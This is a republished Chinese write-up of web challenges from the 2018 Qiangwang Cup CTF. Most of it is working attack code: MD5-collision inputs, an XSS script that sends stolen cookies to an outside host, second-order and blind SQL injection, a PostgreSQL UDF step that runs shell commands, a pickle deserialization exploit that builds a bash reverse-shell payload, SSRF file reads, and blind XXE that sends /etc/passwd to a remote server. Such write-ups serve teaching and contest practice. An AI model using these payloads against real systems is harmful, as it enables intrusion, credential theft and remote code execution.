# 第二届强网杯Web Writeup

阅读量 **303919**

|评论 **2**

发布时间 : 2018-03-30 16:00:21

 **x**

##### 译文声明

本文是翻译文章，文章原作者 l3m0n@Syclover，文章来源：www.cnblogs.com

原文地址：<http://www.cnblogs.com/iamstudy/articles/2th_qiangwangbei_ctf_writeup.html>

译文仅供参考，具体内容表达以及含义原文为准。

作者: [l3m0n@Syclover](mailto:l3m0n@Syclover)

**强网杯活动地址：<https://www.anquanke.com/post/id/100532>**

## WEB 签到

[http://39.107.33.96:10000](http://39.107.33.96:10000/)  
右键源码可获得提示  
第一层用数组

    
    
    param1[]=1&param2[]=a

第二层依旧是用数组

    
    
    param1[]=1&param2[]=a

第三层参考文章  
<https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value>

    
    
    curl -v http://39.107.33.96:10000/ -H "Cookie: PHPSESSID=8iflkrd5vocvllro75oekanat3" --data "param1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&param2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2"

## Share your mind

题目描述

    
    
    http://39.107.33.96:20000
    Please help me find the vulnerability before I finish this site！
    hint：xss bot使用phantomjs，版本2.1.1
    hint2 : xss的点不在report页面

![](https://p0.ssl.qhimg.com/t01a5df1e21ed41d8c7.jpg)

可以看到这里jquery.min.js前面没有`/`来限制，存在[rpo漏洞](http://www.cnblogs.com/iamstudy/articles/ctf_writeup_rpo_attack.html)

被一些同学私聊了一下，可能对rpo没理解到。可以看下图，主要是因为路由的存在，导致加载的js是可自己定义的。

![](https://p2.ssl.qhimg.com/t0181475528d15bed4c.jpg)

以前遇到的rpo都是css方面，因为css语法没有那么严格，所以可以存在很多脏字符，但是js语法比较严，页面内容必须无脏字符才行。

    
    
    http://39.107.33.96:20000/index.php/view/article/784/%2f..%2f..%2f..%2f..%2f

![](https://p2.ssl.qhimg.com/t018ef521889fb1b799.jpg)

这里面对一些特殊符号也进行了实体化编码，所以加载payload就使用了`eval(String.fromCharCode(97))`的形式

获取当前根目录的cookie:

    
    
    b=document.cookie;a="<img src=//ip/"+btoa(b)+">";document.write(a);

打回来的数据提示`Try to get the cookie of path
"/QWB_fl4g/QWB/"`，也就是要获取不同目录下的cookie。可以通过iframe来加载，最后来获取iframe里面的cookie。

    
    
    var i = document.createElement("iframe");
    i.setAttribute("src", "/QWB_fl4g/QWB/");
    document.body.appendChild(i);
    i.addEventListener( "load", function(){
      var content = i.contentWindow.document.cookie;
      location='//ip/'+btoa(content);
    }, false);

最后可拿到flag: `flag=QWB%7Bflag_is_f43kth4rpo%7D; HINT=Try to get the cookie of
path "/QWB_fl4g/QWB/"`

## Three hit

这个题目是一个二次注入，注入点首先是注册用户处，age只能输入数字型，我们可以通过hex编码一下

![](https://p1.ssl.qhimg.com/t010a64421c0eee062e.jpg)

获取flag

    
    
    POST /index.php?func=register HTTP/1.1
    Host: 39.107.32.29:10000
    
    username=l3m0n23&age=0x393939393939393939393939393920756e696f6e2073656c65637420312c2873656c65637420666c61672066726f6d20666c6167206c696d697420302c31292c332c34206c696d697420382c312d2d&password=123456

## 彩蛋

题目描述

    
    
    http://106.75.97.46:8080/phrackCTF/
    
    建设报名网站初期，测试人员发现了构建文件中部分jar版本未更新导致的有意思的RCE，git地址：https://github.com/zjlywjh001/PhrackCTF-Platform-Team

rce稍后研究一下，是[shiro反序列漏洞](http://blog.knownsec.com/2016/08/apache-shiro-java/)

这里也存在一个非预期，就是postersql端口开放了，并且密码有泄露。

[docker搭建版](https://github.com/zjlywjh001/phrackCTF-Team-Docker/blob/master/dockerfile)

![](https://p4.ssl.qhimg.com/t015b28b985db35f16f.jpg)

UDF提权

    
    
    SELECT lo_create(9023);
    
    insert into pg_largeobject values (9023, 0, decode('7f454c4602010100000000000000000003003e0001000000000d0000000000004000000000000000e8210000000000000000000040003800070040001a00190001000000050000000000000000000000000000000000000000000000000000004c140000000000004c1400000000000000002000000000000100000006000000f81d000000000000f81d200000000000f81d200000000000d802000000000000e0020000000000000000200000000000020000000600', 'hex'));
    insert into pg_largeobject values (9023, 1, decode('xxx', 'hex'));
    insert into pg_largeobject values (9023, 2, decode('xxx', 'hex'));
    insert into pg_largeobject values (9023, 3, decode('xxx', 'hex'));
    insert into pg_largeobject values (9023, 4, decode('xxx', 'hex'));
    insert into pg_largeobject values (9023, 5, decode('xxx', 'hex'));
    
    SELECT lo_export(9023, '/tmp/testeval.so');
    
    执行命令：
    CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '/tmp/lib_postgresqludf_sys.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;
    
    select sys_eval('id');

![](https://p4.ssl.qhimg.com/t0136774294e30b62e7.jpg)

删除函数

    
    
    drop function sys_eval

## Python is the best language

质量很高的题目，也已经有师傅把writeup写的很完好了… [python
writeup](https://xianzhi.aliyun.com/forum/topic/2219)

对于python2再做一些记录

本地搭建flask的时候还遇上点坑，创建数据库的时候加入下面代码

    
    
    SQLALCHEMY_DATABASE_URI = "mysql://root:123456@localhost/flask?charset=utf8"
    engine=create_engine(SQLALCHEMY_DATABASE_URI,echo=True)
    Base=declarative_base()
    
    ...
    
    Base.metadata.create_all(engine)

总共分为三步：  
1、绕过沙盒  
2、找到触发点，生成session文件名的规则  
3、导出反序列的字符串到文件

第一步出题人误以为了不导入的模块就不需要做封堵了，所以`subprocess.Popen`、`subprocess.call`可以被调用

第二步，生成session文件名是`md5('bdwsessions'+cookie名)`

第三步，登录的时候就可以进行文件导出，导出的时候一定要用dumpfile…被outfile坑了。

    
    
    abc' union select unhex('aaa'),null,null,null,null,null into dumpfile '/tmp/ffff/59dbc12f95f9e1064020d248ad791c0d'-- -
最后的Exp:

    
    
    import os
    import cPickle
    import subprocess
    import socket
    import binascii
    import hashlib
    
    def md5(s, raw_output=False):
        res = hashlib.md5(s.encode())
        if raw_output:
            return res.digest()
        return res.hexdigest()
    
    def _get_filename(key):
    
        key = key.encode('utf-8')  # XXX unicode review
        hash = md5(key)
        print hash
    
    print _get_filename('bdwsessionslemon')
    
    # Exploit that we want the target to unpickle
    class Exploit(object):
        def __reduce__(self):
            return (subprocess.call, (['bash','-c','{echo,xxxx}|{base64,-d}|{bash,-i}'],)) 
    def serialize_exploit():
        shellcode = cPickle.dumps(Exploit())
        return shellcode
    
    print binascii.b2a_hex(serialize_exploit())

当然其实对于触发，还有另外一种，不需要找到session名的生成方式。

![](https://p1.ssl.qhimg.com/t01e07f0f8aab8827ac.jpg)

其中entries是整个session的个数，threshold是一个固定的数字，存在config.py里面的`SESSION_FILE_THRESHOLD
= 1000`，也就是当session文件超过1w的时候就会列取所有的session进行一个个的反序列化，也是可以触发的。

## Wechat

![](https://p2.ssl.qhimg.com/t011aefb72d68b8727e.jpg)

出题人给出了公众后后面的地址，查看微信公众号的SDK可以发现可以通过一些xml数据进行发送

    
    
    import requests
    
    url = "http://39.107.33.77/"
    content = "Test http://www.baidu.com TEAMKEY icq3be93d38562e68bc0a86368c2d6b2"
    
    data = '''
    <xml>
       <ToUserName><![CDATA[a]]></ToUserName>
       <FromUserName><![CDATA[1',(select content from note limit 3,1))--]]></FromUserName> 
       <CreateTime>1348831860</CreateTime>
       <MsgType><![CDATA[text]]></MsgType>
       <Content><![CDATA[%s]]></Content>
       <MsgId>1234567890123456</MsgId>
       <AgentID>1</AgentID>
    </xml>
    ''' % content
    
    print requests.post(url,data=data).content

通过提示存在注入，可以得到以下信息

    
    
    <xml>
    <ToUserName><![CDATA[1',(select content from note limit 3,1))--]]></ToUserName>
    <FromUserName><![CDATA[a]]></FromUserName>
    <CreateTime>1521882365</CreateTime>
    <MsgType><![CDATA[text]]></MsgType>
    <Content><![CDATA[Success!
    Start Time:You can leave me message here: http://wc.qwb.com:8088/leave_message.php 
    Over Time:Sat Mar 24 09:06:05 2018]]></Content>
    <MsgId>1234567890123456</MsgId>
    </xml>

绑定host: wc.qwb.com 的ip为39.107.33.77

![](https://p2.ssl.qhimg.com/t01829699aaeba7d22b.jpg)

其中message存在注入，限制的比较严格

    
    
    POST /leave_message.php HTTP/1.1
    Host: wc.qwb.com:8088
    
    user=aaaaaaaaaaaaaaa&email=aaaa@qq.com&team=icq3be93d38562e68bc0a86368c2d6b2&message=1'-(sleep(ceil(pi())))-'1&submit=submit

![](https://p3.ssl.qhimg.com/t01f606eef4a3121817.jpg)

比如sleep函数参数里面不能用数字，可以使用`pi()`来绕过，另外就是select from部分。

    
    
    message=12333'-(if(ascii(substring((select@b:=group_concat(username)from{cl0und.adminuser}),%s,1))like'%s',sleep(pi()),0))-'1

这里字段都需要猜解，猜不到password字段

<http://wc.qwb.com:8088/forgetpassword.php>

利用密码找回功能，注入出code，找回管理员密码

进入后台后，发现有一段上传处，主要用于用户的头像上传。

文件上传后便会将图片的内容显示出来。

![](https://p0.ssl.qhimg.com/t0190dec4b486262a3d.jpg)

再往后面看htm中有一段注释。

![](https://p1.ssl.qhimg.com/t01055a23cacad864af.jpg)

其中urlink存在ssrf漏洞，没有限制协议以及后面的字符，当然大部分的特殊符号不能用，只能读取一些配置文件。

    
    
    POST /getimg.php HTTP/1.1
    Host: wc.qwb.com:8088
    Cookie: PHPSESSID=cjq7naar02kajivdftljhj2h44
    
    ------WebKitFormBoundaryOXFwabnsGhrKdxyn
    Content-Disposition: form-data; name="urlink"
    
    file://wc.qwb.com:8088/etc/apache2/apache2.conf
    ------WebKitFormBoundaryOXFwabnsGhrKdxyn--
读取到apache的配置文件，可以看到内容。很郁闷，比赛的时候读取了这个文件，但是base64的内容没取完整导致没看到这部分，还是需要细心…

    
    
    #<Directory /home/qwbweb/backdoor>
    #       Port    23333
    #   Options Indexes FollowSymLinks
    #   AllowOverride None
    #   Require all granted
    #   Here is a Bin with its libc
    #</Directory>

剩下的就是文件读取pwn程序，然后pwnpwnpwn了，太菜了，不会做。

### 教育机构

这个题目其实特别懵逼，给了一个域名，还以为是要来一场真实环境渗透题，所以信息收集方面都做了。比如扫二级域名，扫端口，扫文件(一扫就被ban)

80端口看的实在懵逼，毫无头绪。就看了一下33899端口的东西，有一个.idea的泄露，但是并没有什么用。

<http://39.107.33.75:33899/.idea/workspace.xml>

内容被注释了一段xm调用实体的变量，有点想xxe。

还有一个地方就是提交评论的地方，但是无论怎么样写入都是`alert("未知错误！！！请重试")`

![](https://p2.ssl.qhimg.com/t0186a7cd8b694eadb0.jpg)

传入数组的时候发现出现问题了。

![](https://p0.ssl.qhimg.com/t012128c603810b90b1.jpg)

comment处有被userdecode处理过，试一下xml头，就可以看到有报错，考点应该就是xxe。

    
    
    <?xml version="1.0" encoding="utf-8"?>

![](https://p5.ssl.qhimg.com/t01933a8569390d8a27.jpg)

通过盲xxe，可以获取到文件。

远程服务器布置一个1.xml

    
    
    <!ENTITY % payload SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
    <!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://ip/test/?xxe_local=%payload;'>">
    %int;
    %trick;

comment再进行调用

    
    
    <?xml version="1.0" encoding="utf-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://ip/xxe/1.xml"> %remote; ]></root>

获取一下`/var/www/52dandan.cc/public_html/config.php`

    
    
    <?php
    define(BASEDIR, "/var/www/52dandan.club/");
    define(FLAG_SIG, 1);
    define(SECRETFILE,'/var/www/52dandan.com/public_html/youwillneverknowthisfile_e2cd3614b63ccdcbfe7c8f07376fe431');
    ....
    ?>

拿到了一半的flag

    
    
    Ok,you get the first part of flag : 5bdd3b0ba1fcb40
    then you can do more to get more part of flag

这里出现了一个问题，就是获取`/var/www/52dandan.cc/public_html/common.php`的时候出现了`Detected an
entity reference loop`错误。

![](https://p3.ssl.qhimg.com/t019552d837e8c8502c.jpg)

查了一下资料，libxml解析器默认限制外部实体长度为2k，没法突破，只能寻找一下压缩数据方面的。[php过滤器](http://php.net/manual/zh/filters.compression.php)中提供了一个`zlib.inflate`压缩数据。

    
    
    压缩：echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd");
    解压：echo file_get_contents("php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1");

这样就可以获取到`common.php`文件源码了!

![](https://p3.ssl.qhimg.com/t01f696f6826e2c62f8.jpg)

再获取一下机器的一些ip信息，其中arp信息中保留了一个内网地址

    
    
    /proc/net/arp
    /etc/host
    
    
    IP address       HW type     Flags       HW address            Mask     Device
    192.168.223.18   0x1         0x2         02:42:c0:a8:df:12     *        eth0
    192.168.223.1    0x1         0x2         02:42:91:f9:c9:d4     *        eth0

开放了一个80端口，test.php的shop参数存在注入

    
    
    <!ENTITY % payload     SYSTEM     "http://192.168.223.18/test.php?shop=3'-(case%a0when((1)like(1))then(0)else(1)end)-'1">
    <!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://ip/test/?xxe_local=%payload;'>">
    %int;
    %trick;

做不动了，不想做了。

2333，学习了一个防止扫描器的姿势，如果扫描器爬到test.php，当然对一般的目录扫描效果不大，一般都是HEAD请求。

test.php

    
    
    <?php
    $agent = strtolower($_SERVER['HTTP_USER_AGENT']);
    //check for nikto, sql map or "bad" subfolders which only exist on wordpress
    if (strpos($agent, 'nikto') !== false || strpos($agent, 'sqlmap') !== false || startswith($url,'wp-') || startswith($url,'wordpress') || startswith($url,'wp/'))
    {
        sendBomb();
        exit();
    }
    function sendBomb(){
        //prepare the client to recieve GZIP data. This will not be suspicious
        //since most web servers use GZIP by default
        header("Content-Encoding: gzip");
        header("Content-Length: ".filesize('www.gzip'));
        //Turn off output buffering
        if (ob_get_level()) ob_end_clean();
        //send the gzipped file to the client
        readfile('10G.gzip');
    }
    function startsWith($haystack,$needle){
        return (substr($haystack,0,strlen($needle)) === $needle);
    }
    ?>

know it then do it

本文翻译自www.cnblogs.com
[原文链接](http://www.cnblogs.com/iamstudy/articles/2th_qiangwangbei_ctf_writeup.html)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **安全客** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/103213](/post/id/103213)

安全客 - 有思想的安全新媒体

本文转载自:
[www.cnblogs.com](http://www.cnblogs.com/iamstudy/articles/2th_qiangwangbei_ctf_writeup.html)

如若转载,请注明出处：
<http://www.cnblogs.com/iamstudy/articles/2th_qiangwangbei_ctf_writeup.html>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [强网杯](/tag/强网杯)
  * [Web Writeup](/tag/Web Writeup)

 **+1** __3赞

 __收藏

![](https://p0.ssl.qhimg.com/t01546a096e83e700fe.jpg) 安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

